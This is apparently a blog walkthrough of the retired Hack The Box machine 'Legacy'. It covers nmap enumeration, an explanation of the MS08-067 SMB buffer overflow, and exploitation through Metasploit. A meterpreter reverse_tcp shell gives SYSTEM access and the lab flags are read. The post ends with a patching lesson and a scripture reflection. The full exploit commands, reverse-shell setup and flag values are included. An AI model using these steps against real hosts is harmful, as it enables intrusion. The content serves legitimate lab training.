# Legacy

One command. Zero passwords. Total control. 💻Discover why unpatched services are digital death sentences 💀 (and how to fix them).

***

### 📜 Legacy: Windows SMB Exploitation

![](https://cdn-images-1.medium.com/max/800/1*PLWjIRHJD6Rk42pZ-0Pj4A.png)

Image created by Nicholas Mullenski (Gemini)

**Target:** Legacy (Hack The Box) **OS:** Windows XP **Difficulty:** Easy **Attack Vectors:** SMB Vulnerability (MS08–067) -> Remote Code Execution (CVE-2008–4250).

### Executive Summary

This assessment targeted “Legacy,” a retired Windows XP machine acting as a historical example of SMB vulnerabilities. The assessment began with standard enumeration, which identified the operating system as Windows XP SP3. By leveraging the infamous **MS08–067 (NetAPI)** vulnerability, we bypassed authentication entirely and executed arbitrary code via the Server Service.

Unlike modern systems that require complex privilege escalation chains, this specific vulnerability granted immediate `SYSTEM` (Root) access upon exploitation, allowing for the retrieval of both user and root flags in a single strike.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

**1.1.1 Nmap Scan**

The assessment began with a full TCP port scan using Nmap to identify open services and determine the operating system version on the target **`10.10.10.4`**.

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Legacy]
└─$ nmap -sC -sV -A -vvv 10.10.10.4 -Pn

PORT    STATE SERVICE      REASON          VERSION
135/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack ttl 127 Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:d9:99 (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
```

**1.1.2 Nmap Scan Analysis:**

* The scan identified three open ports on the target **`10.10.10.4`**: **135 (MSRPC)**, **139 (NetBIOS-SSN)**, and **445 (Microsoft-DS)**.
* The Nmap scripting engine (**`smb-os-discovery`**) provided critical fingerprinting data, explicitly identifying the operating system as **Windows XP** and the computer name as **LEGACY**. The scan also noted that message signing is disabled, which is a default but insecure configuration.
* Most importantly, the presence of Windows XP combined with open SMB ports (445) is a significant indicator of historical vulnerabilities. Windows XP has been End-of-Life (EOL) since 2014, meaning it is susceptible to critical remote code execution exploits that target the SMBv1 protocol, such as MS08–067 (NetAPI) or MS17–010 (EternalBlue).

**1.1.3 Key Findings:**

* **Open Ports:** 139 & 445 (SMB), 135 (RPC).
* **OS Version:** Windows XP SP3 (English).
* **Host Name:** LEGACY.
* **Vulnerability Assessment:** The target is running a deprecated OS with exposed file-sharing services. This represents a critical risk for buffer overflow attacks against the Server Service.

#### 1.2 Vulnerability Assessment

**1.2.1 Script Scanning:**

* To confirm the hypothesis that the legacy operating system contains unpatched SMB vulnerabilities, we utilized Nmap’s targeted vulnerability scanning scripts against ports 139 and 445.

**Command:**

```
nmap --script smb-vuln* -p 139,445 10.10.10.4
```

**1.2.2 Vulnerability Identification (CVE-2008–4250)**

* The script output definitively identified the target as vulnerable to **MS08–067 (NetAPI)**.

**Output Analysis:**

```
Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The 'Server' service in Microsoft Windows does not properly handle
|           crafted RPC requests, which allows remote attackers to execute
|           arbitrary code.
```

#### 1.3 Technical Explanation:

**Vulnerability:** _Microsoft Server Service RPC Handling Remote Code Execution_ **CVE:** _CVE-2008–4250_

* This vulnerability is a classic **stack-based buffer overflow** located in the **`netapi32.dll`** library.
* The flaw occurs because the Server Service fails to properly check the bounds of a path string sent via a crafted RPC request. By sending a malformed path that exceeds the buffer size, we can overwrite the **Return Address** on the stack. This redirects the CPU’s execution flow to our own malicious code (shellcode) instead of returning to the normal program function. Since the Server Service runs as **`SYSTEM`**, our code executes with the highest possible privileges.

### 2.0 Initial Shell

#### 2.1 Payload Delivery

**2.1.1 Metasploit Configuration**

* Given the complexity of the MS08–067 stack overflow (which requires precise memory offsets for specific Windows XP service pack languages), we utilized the Metasploit Framework to ensure stability.

**Command:**

```
msfconsole -q
use exploit/windows/smb/ms08_067_netapi
```

* **Configuration:** We targeted the remote machine (**`RHOSTS`**) and configured our local listener (**`LHOST`**) to capture the reverse connection.

```
msf6 > set RHOSTS 10.10.10.4
msf6 > set LHOST 10.10.14.xx  # (Replace with your tun0 IP)
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
```

#### 2.2 Execution & Verification

**2.2.1 Exploit Execution**

* With the payload configured, we executed the exploit against the Server Service.

```
msf6 > run

[*] Started reverse TCP handler on 10.10.14.xx:4444
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.xx:4444 -> 10.10.10.4:1032)
```

**2.2.2 Identity Verification**

* Upon receiving the session, we verified our privilege level. Because the vulnerable service (**`lanmanserver`**) runs with System-level permissions, the exploit grants immediate administrative control without needing further escalation.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### 2.3 Shell Stabilization

**2.3.1** Since we are utilizing the **Meterpreter** payload, the shell is inherently stable. It provides robust functionality (file upload/download, hash dumping, screenshotting) without the need for Python TTY stabilization techniques typically required for standard netcat shells.

### 3.0 Post-Exploitation

#### 3.1 Enumeration

**3.1.1 System Confirmation**

* Upon establishing the session, we confirmed that MS08–067 grants immediate System-level access. Unlike modern exploits that often require a secondary privilege escalation phase (e.g., from **`www-data`** to **`root`**), this vulnerability compromises the core service itself.

**Command:**

```
systeminfo
```

Output:

```
Computer        : LEGACY
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Meterpreter     : x86/windows
```

#### 3.2 Flag Capture

**3.2.1 Retrieving User Flag**

* We navigated to the user profile directory. On Windows XP, user profiles are located in **`C:\Documents and Settings\`** rather than **`C:\Users\`**.

**Command:**

```
C:\WINDOWS\system32>type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f
```

**3.2.2 Retrieving Root Flag**

* With full administrative access, we retrieved the final proof of compromise from the Administrator’s desktop.

**Command:**

```
C:\WINDOWS\system32>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713
```

![](https://cdn-images-1.medium.com/max/800/1*pPPGEJELAlkPqCuI7eGtPA.png)

Image created by Nicholas Mullenski (Gemini)

### 4.0 Final Thoughts: The Red Team Mandate

Legacy serves as a reminder of the “Dark Ages” of internet security. The MS08–067 vulnerability was a wormable exploit that allowed malware like Conficker to spread globally, infecting millions of computers without any user interaction.

While Windows XP is retired, the lesson remains relevant: **Unpatched services are open doors.** A single buffer overflow in a listening service bypasses every firewall rule (if the port is open) and password policy in place. This machine demonstrates that security is not just about strong passwords; it is about patching the structural integrity of the software itself.

### 5.0 Spiritual Connection

**Hebrews 8:13 (NIV)**

> “By calling this covenant ‘new,’ he has made the first one obsolete; and what is obsolete and aging will soon disappear.”

**How it ties into the machine:**

* **The Name:** The machine is literally named “Legacy,” defining something old, handed down, and often outdated.
* **The Obsolescence:** Just as the Old Covenant became obsolete because it could not offer perfection or true security, Windows XP and the NetAPI protocol became obsolete because they could not withstand the attacks of the modern world.
* **The Application:** We cannot rely on “Legacy” systems — whether digital or spiritual — to protect us today. We must upgrade to the New: a patched system for our networks, and a new heart for our lives. Holding onto the obsolete only guarantees compromise.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/8buAHtm2fK)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 5, 2026](https://medium.com/p/5f12678846bd).

[Canonical link](https://medium.com/@nicholasmullenski/legacy-smashing-windows-xp-with-ms08-067-instant-root-5f12678846bd)

Exported from [Medium](https://medium.com) on September 1, 2026.
